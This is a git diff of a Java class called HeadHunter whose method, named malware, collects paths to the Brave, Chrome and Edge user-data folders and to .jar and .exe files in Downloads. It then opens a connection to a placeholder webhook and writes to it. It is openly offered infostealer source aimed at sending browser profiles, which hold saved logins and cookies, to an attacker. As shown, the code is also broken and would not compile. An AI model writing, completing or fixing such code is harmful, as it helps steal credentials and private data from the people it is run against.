@@ -7,6 +7,7 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
+import java.util.Arrays;
 
 public class HeadHunter {
     File file;
@@ -16,22 +17,27 @@ public class HeadHunter {
     }
 
     void malware(String url) {
+        char filename;
         ArrayList<String> files = new ArrayList<String>();
-        String brave_data = new String(System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
-        String chrome_data = new String(System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
-        String edge_data = new String(System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
-        String jarfile = new String(System.getenv("DOWNLOADS") + "" + ".jar");
-        String exefile = new String(System.getenv("DOWNLOADS") + "" + ".exe");
-        files.add(brave_data); // this can affect me, cause i use Brave as my main browser
-        files.add(chrome_data); // gets chrome user data folder
-        files.add(edge_data); // gets edge user data folder
-        files.add(jarfile); // gets jar files
-        files.add(exefile); // gets exe files
+        String brave_data = (System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
+        String chrome_data = (System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
+        String edge_data = (System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
+        String jarfile = (System.getenv("DOWNLOADS") + filename + ".jar");
+        String exefile = (System.getenv("DOWNLOADS") + filename + ".exe");
+        files.add(brave_data);
+        files.add(chrome_data);
+        files.add(edge_data);
+        files.add(jarfile);
+        files.add(exefile);
         if (files.add(brave_data) ||
                 files.add(chrome_data) || files.add(edge_data)
                 || files.add(jarfile) || files.add(exefile)) {
             try {
-                HttpURLConnection webhook = (HttpURLConnection) new URL(url).openConnection();
+                HttpURLConnection webhook = (HttpURLConnection) new URL("webhook here").openConnection();
+                try {
+                    webhook.getOutputStream().write(files.get(exefile));
+                } catch (IOException e2) {
+                }
             } catch (IOException e1) {
                 e1.printStackTrace();
             }
